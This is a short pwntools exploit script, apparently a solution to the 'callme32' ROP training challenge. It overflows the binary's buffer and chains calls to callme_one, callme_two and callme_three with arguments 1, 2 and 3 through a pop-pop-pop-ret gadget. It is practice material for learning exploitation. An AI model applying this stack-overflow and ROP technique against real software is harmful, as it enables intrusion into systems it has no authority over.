#!/root/env/bin/python
from pwn import *
elf = context.binary = ELF("callme32")
gdb_cmd = [
    "c"
]
io = process(elf.path)
gdb.attach(io,gdbscript="\n".join(gdb_cmd))

rop_addr = 0x080488a9            # pop esi; pop edi; pop ebp; ret;
callme_three = 0x80485b0
callme_two = 0x8048620
callme_one = 0x80485c0
offset = cyclic_find("laaa")

exploit = p32(callme_one)+p32(rop_addr)+p32(1)+p32(2)+p32(3)+p32(callme_two)+p32(rop_addr)+p32(1)+p32(2)+p32(3)+p32(callme_three)+p32(rop_addr)+p32(1)+p32(2)+p32(3)

io.sendline("A"*offset+exploit)
io.interactive()